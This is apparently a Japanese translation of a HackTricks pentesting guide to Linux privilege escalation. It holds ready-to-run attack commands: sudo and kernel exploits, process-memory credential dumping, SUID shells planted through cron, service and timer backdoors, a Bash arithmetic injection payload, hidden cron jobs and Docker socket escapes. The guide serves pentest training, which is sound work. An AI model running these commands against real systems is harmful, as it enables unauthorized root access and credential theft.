# Linux 権限昇格

{{#include ../../banners/hacktricks-training.md}}

## システム情報

### OS 情報

実行中のOSについての情報収集を始めましょう。
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### パス

もし **`PATH` 変数の中の任意のフォルダに書き込み権限がある** 場合、いくつかのライブラリやバイナリをハイジャックできる可能性があります:
```bash
echo $PATH
```
### Env 情報

環境変数に興味深い情報、passwords または API keys はありますか?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

kernel version を確認し、escalate privileges に使える exploit があるか調べる
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
良い脆弱なカーネルのリストといくつかの既に存在する **compiled exploits** は次で見つけられます: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
他にも **compiled exploits** を見つけられるサイト: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

そのサイトからすべての脆弱なカーネルのバージョンを抽出するには、次のようにします:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
カーネルのエクスプロイトを探すのに役立つツール:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim,only checks exploits for kernel 2.x)

常に **Googleでカーネルバージョンを検索する** ことをおすすめします。カーネルバージョンが特定のカーネルエクスプロイトに記載されていることがあり、その場合そのエクスプロイトが有効であることを確認できます。

追加のカーネルエクスプロイト手法:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo バージョン

以下に表示されている脆弱な sudo バージョンに基づく:
```bash
searchsploit sudo
```
この grep を使って sudo のバージョンが脆弱かどうか確認できます。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo の 1.9.17p1 より前のバージョン（**1.9.14 - 1.9.17 < 1.9.17p1**）では、sudo の `--chroot` オプションを利用した場合、`/etc/nsswitch.conf` ファイルがユーザーが制御するディレクトリから使用されると、権限のないローカルユーザーが root に権限を昇格できてしまいます。

Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Before running the exploit, make sure that your `sudo` version is vulnerable and that it supports the `chroot` feature.

For more information, refer to the original [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

出典: @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg signature verification failed

**smasher2 box of HTB** を確認して、このvulnがどのように悪用されるかの**例**を参照してください
```bash
dmesg 2>/dev/null | grep "signature"
```
### さらなるシステム列挙
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 可能な防御策

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

もし docker container の中にいるなら、そこから escape を試みることができます：

{{#ref}}
docker-security/
{{#endref}}

## ドライブ

どこに何が **what is mounted and unmounted** されているか、どこでなぜそうなっているかを確認してください。もし何かが unmounted であれば、それを mount してプライベートな情報を確認してみてください。
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 便利なソフトウェア

有用なバイナリを列挙する
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
また、**any compiler is installed** か確認してください。これは、kernel exploit を使用する必要がある場合に役立ちます。使用するマシン（または類似のマシン）でコンパイルすることが推奨されるためです。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 脆弱なソフトウェアがインストールされている

**インストールされているパッケージやサービスのバージョン**を確認してください。例えば、古い Nagios バージョンが存在し、escalating privileges に悪用される可能性があります…\
より疑わしいインストール済みソフトウェアのバージョンは手動で確認することを推奨します。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
マシンにSSHでアクセスできる場合、**openVAS**を使用してマシン内にインストールされている古いまたは脆弱なソフトウェアをチェックすることもできます。

> [!NOTE] > _これらのコマンドは大量の情報を表示し、その多くがほとんど役に立たないことに注意してください。したがって、OpenVASのようなアプリケーションや同様のツールを使用して、インストール済みソフトウェアのバージョンが既知のexploitsに対して脆弱かどうかを確認することを推奨します_

## プロセス

どの**プロセス**が実行されているかを確認し、どのプロセスが**本来より多くの権限を持っている**か（例えば tomcat が root で実行されているなど）をチェックしてください。
```bash
ps aux
ps -ef
top -n 1
```
常に[**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md)が動作していないか確認してください。**Linpeas**はプロセスのコマンドライン内の`--inspect`パラメータを確認してそれらを検出します。\
また、**プロセスのバイナリに対する権限を確認してください**。誰かのバイナリを上書きできるかもしれません。

### Process monitoring

プロセスを監視するために[**pspy**](https://github.com/DominicBreuker/pspy)のようなツールを使えます。これは、脆弱なプロセスが頻繁に実行されている場合や一定の条件が満たされたときに実行されるプロセスを特定するのに非常に役立ちます。

### Process memory

サーバの一部のサービスは**認証情報をメモリ内に平文で保存する**。\
通常、他のユーザーが所有するプロセスのメモリを読み取るには**root privileges**が必要です。そのため、これは通常すでにrootであり追加の認証情報を発見したい場合により有用です。\
ただし、**通常ユーザーとして自分が所有するプロセスのメモリは読み取ることができます**。

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: 同じ uid であれば全てのプロセスをデバッグできます。これは ptrace が従来どおりに動作する古典的な方法です。
> - **kernel.yama.ptrace_scope = 1**: 親プロセスのみがデバッグ可能です。
> - **kernel.yama.ptrace_scope = 2**: 管理者のみが ptrace を使用できます（CAP_SYS_PTRACE capability が必要です）。
> - **kernel.yama.ptrace_scope = 3**: ptrace で追跡できるプロセスはありません。一度設定すると、ptrace を再び有効にするには再起動が必要です。

#### GDB

たとえば FTP サービスのメモリにアクセスできる場合、Heap を取得してその中の認証情報を検索できます。
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB スクリプト
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

指定したプロセスIDに対して、**maps はそのプロセスの仮想アドレス空間内でどのようにメモリがマッピングされているかを示し**、また **各マッピング領域の権限を表示します**。擬似ファイルである **mem** は**プロセスのメモリ自体にアクセスできるようにします**。**maps** ファイルから、どの **メモリ領域が読み取り可能か（readable）** とそれらのオフセットがわかります。この情報を使って **mem ファイル内をシークし、読み取り可能な領域をすべてダンプしてファイルへ保存します**。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` はシステムの**物理**メモリにアクセスするためのもので、仮想メモリにはアクセスしません。カーネルの仮想アドレス空間には /dev/kmem を使ってアクセスできます.\\  
通常、`/dev/mem` は **root** と kmem グループのみが読み取り可能です。
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump（linux用）

ProcDumpは、SysinternalsスイートのWindows向けにあるクラシックなProcDumpツールをLinux向けに再構想したものです。入手先: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### ツール

プロセスのメモリをダンプするには、次を使用できます:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_手動でroot要件を削除し、あなたが所有するプロセスをダンプできます
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root が必要です)

### プロセスメモリからの認証情報

#### 手動の例

authenticator プロセスが実行されている場合:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
processをdumpして（前のセクションを参照して、processのmemoryをdumpするさまざまな方法を確認してください）、memory内のcredentialsを検索できます:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

ツール [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) は、メモリから**プレーンテキストの認証情報を盗み**、いくつかの**よく知られたファイル**からも取得します。正しく動作するにはroot権限が必要です。

| 機能                                           | プロセス名         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

If a web “Crontab UI” panel (alseambusher/crontab-ui) runs as root and is only bound to loopback, you can still reach it via SSH local port-forwarding and create a privileged job to escalate.

Typical chain
- Discover loopback-only port (e.g., 127.0.0.1:8000) and Basic-Auth realm via `ss -ntlp` / `curl -v localhost:8000`
- Find credentials in operational artifacts:
- Backups/scripts with `zip -P <password>`
- systemd unit exposing `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tunnel and login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- 高権限のジョブを作成して即実行する（SUID shellをドロップする）:
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- 使用する:
```bash
/tmp/rootshell -p   # root shell
```
ハードニング

- Crontab UI を root で実行しない; 専用ユーザーと最小限の権限で制限する
- localhost にバインドし、さらに firewall/VPN でアクセスを制限する; パスワードの使い回しを避ける
- unit files に secrets を埋め込まない; secret stores または root のみ読み取り可能な EnvironmentFile を使う
- オンデマンド実行ジョブの audit/logging を有効にする

スケジュールされたジョブに脆弱性がないか確認する。root によって実行されるスクリプトを悪用できるかもしれない（wildcard vuln? root が使うファイルを変更できるか？symlinks を使えるか？root が使うディレクトリに特定のファイルを作成できるか？）
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron の PATH

For example, inside _/etc/crontab_ you can find the PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_ユーザー "user" が /home/user に書き込み権限を持っている点に注意_)

この crontab 内で root ユーザーが PATH を設定せずにコマンドやスクリプトを実行しようとする場合。例えば: _\* \* \* \* root overwrite.sh_\
すると、次の方法で root シェルを取得できます:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron がワイルドカードを含むスクリプトを実行している場合 (Wildcard Injection)

スクリプトが root によって実行され、コマンド内に “**\***” が含まれている場合、これを悪用して予期しない動作（例えば privesc）を引き起こすことができます。例:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**ワイルドカードがパスの前に付く（例：** _**/some/path/\***_ **）場合、それは脆弱ではありません（_**./\***_ **も同様に脆弱ではありません）。**

ワイルドカードの悪用テクニックの詳細は次のページを参照してください：


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash は ((...))、$((...)) および let における算術評価の前に parameter expansion と command substitution を実行します。もし root cron/parser が信頼できないログフィールドを読み取り、それらを算術コンテキストに渡すと、攻撃者は cron 実行時に root として実行される command substitution $(...) を注入できます。

- なぜ動くのか: Bash では展開は次の順序で行われます: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion。したがって `$(/bin/bash -c 'id > /tmp/pwn')0` のような値はまず置換され（コマンドが実行され）、残った数値 `0` が算術に使われるためスクリプトはエラーなく継続します。

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- 悪用方法: パースされるログに攻撃者が制御するテキストを書き込み、数値に見えるフィールドが command substitution を含み末尾が数字になるようにします。算術が有効なままになるよう、コマンドが stdout に出力しない（またはリダイレクトする）ことを確認してください。
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

If you **can modify a cron script** executed by root, you can get a shell very easily:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
rootによって実行されるscriptが**directory where you have full access**を使用している場合、そのfolderを削除して、あなたが制御するscriptを配置する別の場所に向ける**create a symlink folder to another one**ことが有用かもしれません。
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### カスタム署名された cron バイナリ（書き込み可能な payload を持つ）
Blue teams は、cron で起動されるバイナリを root として実行する前に、カスタムの ELF セクションをダンプしてベンダー文字列を grep で確認し「sign」することがあります。もしそのバイナリが group-writable（例: `/opt/AV/periodic-checks/monitor` が `root:devs 770` 所有）で、signing material を leak できるなら、セクションを偽造して cron タスクをハイジャックできます:

1. `pspy` を使って検証フローをキャプチャします。Era では、root が `objcopy --dump-section .text_sig=text_sig_section.bin monitor` を実行し、その後 `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` を実行してからファイルを実行していました。
2. `signing.zip` にある leaked key/config を使って期待される証明書を再作成します:
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. 悪意ある置換バイナリを作成します（例: SUID bash を落とす、あなたの SSH key を追加するなど）。証明書を `.text_sig` に埋め込んで grep が通るようにします:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. 実行ビットを保持したままスケジュールされたバイナリを上書きします:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. 次の cron 実行を待ちます。単純な署名チェックが通ると、あなたの payload が root として実行されます。

### Frequent cron jobs

プロセスを監視して、1分、2分、5分ごとに実行されているプロセスを探せます。これを利用して権限昇格できるかもしれません。

例えば、**1分間 0.1秒ごとに監視**し、**実行回数の少ないコマンドでソート**して、最も多く実行されたコマンドを削除するには、次のようにします:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**他にも使えます** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (これは起動するすべてのプロセスを監視して一覧表示します)。

### 見えない cron jobs

コメントの後に**キャリッジリターンを入れる**（改行文字は入れない）ことで、cronjob を作成でき、cronjob は動作します。例（キャリッジリターン文字に注意）:
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## サービス

### 書き込み可能な _.service_ ファイル

書き込み可能な `.service` ファイルがないか確認してください。もし書き込みできるなら、それを変更してサービスが**開始**、**再起動**、または**停止**されたときにあなたの **backdoor** を**実行**させるようにできます（マシンを再起動するまで待つ必要があるかもしれません）。\  
例えば、`.service` ファイル内に your backdoor を作成し、**`ExecStart=/tmp/script.sh`** のようにします。

### 書き込み可能な service バイナリ

サービスによって実行されるバイナリに対して書き込み権限がある場合、それらを backdoor に置き換えることで、サービスが再実行されたときに backdoor が実行されることを念頭に置いてください。

### systemd PATH - Relative Paths

次のコマンドで **systemd** が使用する PATH を確認できます:
```bash
systemctl show-environment
```
パス上のいずれかのフォルダに**書き込み**できることが分かった場合、**escalate privileges**できる可能性があります。次に、以下のようなサービス設定ファイルで**相対パスが使用されているか**を探す必要があります:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
その後、書き込み可能な systemd PATH フォルダ内に、相対パスのバイナリと**同じ名前の** **executable** を作成してください。サービスが脆弱なアクション（**Start**, **Stop**, **Reload**）を実行するよう要求されると、あなたの **backdoor will be executed**（権限のないユーザーは通常サービスを start/stop できませんが、`sudo -l` が使えるか確認してください）。

**サービスの詳細は `man systemd.service` を参照してください。**

## **Timers**

**Timers** は名前が `**.timer**` で終わる systemd ユニットファイルで、`**.service**` ファイルやイベントを制御します。**Timers** はカレンダー時間イベントや単調時間イベントのサポートを内蔵しており、非同期で実行できるため、cron の代替として使用できます。

すべての timers は次のコマンドで列挙できます:
```bash
systemctl list-timers --all
```
### 書き込み可能なタイマー

もしタイマーを変更できるなら、systemd.unit の既存のユニット（例: `.service` や `.target`）を実行させることができます。
```bash
Unit=backdoor.service
```
In the documentation you can read what the Unit is:

> このタイマーが満了したときにアクティブにする Unit。引数はサフィックスが ".timer" ではない unit 名です。指定しない場合、この値は timer unit と同じ名前で、サフィックスを除いた service にデフォルトされます（上参照）。アクティブにされる unit 名と timer unit の unit 名は、サフィックス以外は同一にすることが推奨されます。

Therefore, to abuse this permission you would need to:

- `.service` のような systemd unit で、**書き込み可能なバイナリを実行している**ものを見つける
- 相対パスで実行しており、かつ **systemd PATH** に対して **書き込み権限** を持っているような systemd unit を見つける（その実行ファイルを偽装するため）

**Learn more about timers with `man systemd.timer`.**

### **タイマーの有効化**

タイマーを有効化するには root 権限が必要で、次を実行します:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## ソケット

Unix Domain Sockets (UDS) は、クライアント・サーバモデル内で同一または別のマシン間のプロセス間通信を可能にします。これらは標準の Unix ディスクリプタファイルを利用してコンピュータ間通信を行い、`.socket` ファイルを通じて設定されます。

Sockets can be configured using `.socket` files.

**Learn more about sockets with `man systemd.socket`.** このファイル内では、いくつかの興味深いパラメータを設定できます:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: これらのオプションは種類が異なりますが、要約すると **どこでソケットを待ち受けるかを指定する**（AF_UNIX ソケットファイルのパス、IPv4/6 および/または待ち受けるポート番号など）ために使われます。
- `Accept`: ブーリアン引数を受け取ります。If **true**, 各着信接続ごとに **service instance is spawned for each incoming connection** され、その接続ソケットのみが渡されます。If **false**, すべてのリッスンソケット自体が **passed to the started service unit** され、すべての接続に対して単一の service unit のみが生成されます。この値はデータグラムソケットや FIFO では無視され、単一の service unit が無条件にすべての着信トラフィックを処理します。**Defaults to false**。パフォーマンス上の理由から、新しいデーモンは `Accept=no` に適した方式でのみ書くことが推奨されます。
- `ExecStartPre`, `ExecStartPost`: 1 つ以上のコマンドラインを取り、リッスンする **sockets**/FIFOs がそれぞれ **作成** されバインドされる前後に **実行** されます。コマンドラインの最初のトークンは絶対パスのファイル名でなければならず、その後にプロセスの引数が続きます。
- `ExecStopPre`, `ExecStopPost`: リッスンする **sockets**/FIFOs がそれぞれ **閉じられ** 削除される前後に **実行** される追加の **コマンド** です。
- `Service`: 着信トラフィック時に **activate** する **service** ユニット名を指定します。この設定は Accept=no のソケットでのみ許可されます。デフォルトでは、ソケットと同じ名前を持つ service（サフィックスを置換したもの）になります。ほとんどの場合、このオプションを使う必要はありません。

### 書き込み可能な .socket ファイル

もし **writable** な `.socket` ファイルを見つけたら、`[Socket]` セクションの先頭に `ExecStartPre=/home/kali/sys/backdoor` のような行を **add** することができ、その backdoor はソケットが作成される前に実行されます。したがって、**おそらくマシンの再起動を待つ必要がある**でしょう。\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### 書き込み可能なソケット

もし **identify any writable socket** した場合（_ここで言っているのは設定ファイルの `.socket` ではなく Unix Sockets のことです_）、そのソケットと **communicate** でき、脆弱性を exploit できる可能性があります。

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Raw接続
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

注意：**sockets listening for HTTP** requests が存在する可能性があります（_ここで言っているのは .socket files ではなく、unix sockets として動作しているファイルのことです_）。これを確認するには次のようにします:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
ソケットが **responds with an HTTP** request の場合、**communicate** が可能で、場合によっては **exploit some vulnerability** することもできます。

### 書き込み可能な Docker Socket

The Docker socket, often found at `/var/run/docker.sock`, は保護されるべき重要なファイルです。デフォルトでは、`root` ユーザーと `docker` グループのメンバーが書き込み可能です。このソケットへの write access を持つことは privilege escalation に繋がる可能性があります。以下では、これがどのように行われるかと、Docker CLI が利用できない場合の代替手段について説明します。

#### **Privilege Escalation with Docker CLI**

If you have write access to the Docker socket, you can escalate privileges using the following commands:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
これらのコマンドは、ホストのファイルシステムに対して root 権限でアクセスできるコンテナを実行することを可能にします。

#### **Docker API を直接使用する**

Docker CLI が利用できない場合でも、Docker socket は Docker API と `curl` コマンドを使って操作できます。

1.  **List Docker Images:** 利用可能なイメージの一覧を取得します。

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** ホストシステムのルートディレクトリをマウントするコンテナを作成するリクエストを送信します。

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

作成したコンテナを起動します:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** `socat` を使用してコンテナへの接続を確立し、その中でコマンドを実行できるようにします。

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` 接続を設定した後、コンテナ内でホストのファイルシステムに対して root 権限で直接コマンドを実行できます。

### その他

docker socket に対して書き込み権限がある（**group `docker` に所属している**）場合は、[**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group) が存在する点に注意してください。もし [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising) であれば、それも悪用可能です。

docker からの脱出や悪用による権限昇格の**さらに多くの方法**については、次を確認してください：


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

もし **`ctr`** コマンドを使用できる場合は、次のページを確認してください — **you may be able to abuse it to escalate privileges**：


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

もし **`runc`** コマンドを使用できる場合は、次のページを確認してください — **you may be able to abuse it to escalate privileges**：


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus はアプリケーション間の効率的な相互作用とデータ共有を可能にする高度な inter-Process Communication (IPC) system です。現代の Linux システムを念頭に設計されており、さまざまな形態のアプリケーション通信に対して堅牢なフレームワークを提供します。

このシステムは柔軟で、プロセス間のデータ交換を強化する基本的な IPC をサポートし、強化された UNIX domain sockets を思わせる機能を提供します。さらに、イベントやシグナルのブロードキャストを助け、システムコンポーネント間のシームレスな統合を促進します。たとえば、Bluetooth デーモンからの着信通知のシグナルが音楽プレーヤーにミュートを促し、ユーザー体験を向上させるといった使い方が可能です。加えて、D-Bus はリモートオブジェクトシステムをサポートしており、サービス要求やメソッド呼び出しを簡素化し、従来は複雑だったプロセスを効率化します。

D-Bus は **allow/deny model** 上で動作し、ポリシー規則の累積的な一致によってメッセージ権限（メソッド呼び出し、シグナルの送出など）を管理します。これらのポリシーはバスとのやり取りを指定し、これらの権限を悪用することで権限昇格につながる可能性があります。

例として、`/etc/dbus-1/system.d/wpa_supplicant.conf` にあるポリシーが示されており、root ユーザーが `fi.w1.wpa_supplicant1` を所有し、そこへ送信および受信するための権限が記述されています。

